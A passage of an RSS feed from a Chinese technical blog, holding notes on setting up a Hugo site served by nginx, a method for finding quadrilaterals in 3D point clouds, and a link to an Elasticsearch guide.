        #
    &lt;/a&gt;
    创建项目
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
  $ /usr/local/go/bin/hugo new site myblogs
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;创建post&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%9b%e5%bb%bapost&#34;&gt;
        #
    &lt;/a&gt;
    创建post
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
  $ /usr/local/go/bin/hugo new post/first.md
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;使用themes&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8themes&#34;&gt;
        #
    &lt;/a&gt;
    使用themes
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
  $ cd themes/
  $ git clone https://github.com/kakawait/hugo-tranquilpeak-theme.git
  $ cp hugo-tranquilpeak-theme/exampleSite/* ..
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;构造页面&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%9e%84%e9%80%a0%e9%a1%b5%e9%9d%a2&#34;&gt;
        #
    &lt;/a&gt;
    构造页面
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;
  $ cd content
  $ mkdir archives
  $ touch archives/_index.md
  $ mkdir categories
  $ touch categories/_index.md
  $ mkdir tags
  $ touch tags/_index.md
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行成功后创建出下面的页面：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
  http://[Your_blog_DNS]/archives
  http://[Your_blog_DNS]/categories
  http://[Your_blog_DNS]/tags
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;服务部署&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%9c%8d%e5%8a%a1%e9%83%a8%e7%bd%b2&#34;&gt;
        ##
    &lt;/a&gt;
    服务部署
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;第一步，使用 hugo 命令生成静态文件内容&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cd &amp;lt;hugo project home&amp;gt;
$ hugo
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行完以上操作后会在项目目录中产生 public 目录，这个目录中包括了可以部署的静态文件。把 public 目录复制到 nginx 的公开目录中。&lt;/p&gt;
&lt;p&gt;第二步，配置 nginx&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;server {
  listen       80;
  listen       [::]:80;
  server_name  yourhostname;

  location / {
    root /directory/of/public;
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;至此，系统的搭建基本完成，赶紧访问吧 :-)&lt;/p&gt;
&lt;h1 id=&#34;hugo-theme开发&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#hugo-theme%e5%bc%80%e5%8f%91&#34;&gt;
        ##
    &lt;/a&gt;
    hugo theme开发
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;templating
&lt;ul&gt;
&lt;li&gt;变量访问: {{ var }}&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;front matter&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gohugo.io/variables/&#34;&gt;variables&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Site variables
&lt;ul&gt;
&lt;li&gt;作用：访问站点配置文件中的内容&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Page variables&lt;/li&gt;
&lt;li&gt;File variables&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title></title>
      <link>/1/01/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/1/01/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-64.png&#34; alt=&#34;icon&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title></title>
      <link>/1/01/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/1/01/</guid>
      <description>&lt;h1 id=&#34;流程框架&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%b5%81%e7%a8%8b%e6%a1%86%e6%9e%b6&#34;&gt;
        ##
    &lt;/a&gt;
    流程框架
&lt;/div&gt;
&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;从 3D 点云中分割平面&lt;/li&gt;
&lt;li&gt;把平面包含的点映射 project 到平面上&lt;/li&gt;
&lt;li&gt;映射出的 3D 平面变换到 2D 坐标系平面上&lt;/li&gt;
&lt;li&gt;从 2D 平面找出平行四边形&lt;/li&gt;
&lt;li&gt;将平行四边形反向旋转恢复出 3D 空间中的平面四边形&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;从-2d-平面照出平行四边形的方法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bb%8e-2d-%e5%b9%b3%e9%9d%a2%e7%85%a7%e5%87%ba%e5%b9%b3%e8%a1%8c%e5%9b%9b%e8%be%b9%e5%bd%a2%e7%9a%84%e6%96%b9%e6%b3%95&#34;&gt;
        ##
    &lt;/a&gt;
    从 2D 平面照出平行四边形的方法
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;pca检测主轴方向&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#pca%e6%a3%80%e6%b5%8b%e4%b8%bb%e8%bd%b4%e6%96%b9%e5%90%91&#34;&gt;
        #
    &lt;/a&gt;
    PCA检测主轴方向
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;可以找到平行四边形的两个主轴方向，但无法确定每个边的长度&lt;/p&gt;
&lt;p&gt;问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当电云分布不均匀时，导致PCA主轴方向向密度更高的方向略微偏移&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;边缘检测法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%be%b9%e7%bc%98%e6%a3%80%e6%b5%8b%e6%b3%95&#34;&gt;
        #
    &lt;/a&gt;
    边缘检测法
&lt;/div&gt;
&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;使用包络 (Graham Scan) 扫描出四边形的外围轮廓线&lt;/li&gt;
&lt;li&gt;将靠近轮廓线的点距离小于某个阀值的所有点取出来&lt;/li&gt;
&lt;li&gt;在取出的点中使用 RANSAC 估计4根直线&lt;/li&gt;
&lt;li&gt;计算出 4 根直线的交点&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>SearchEngine</title>
      <link>/1/01/searchengine/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/1/01/searchengine/</guid>
      <description>&lt;!--toc--&gt;
&lt;h1 id=&#34;参考资料&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99&#34;&gt;
        ##
    &lt;/a&gt;
    参考资料：
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.gitbook.com/book/looly/elasticsearch-the-definitive-guide-cn&#34;&gt;Elasticsearch权威指南（中文版）&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
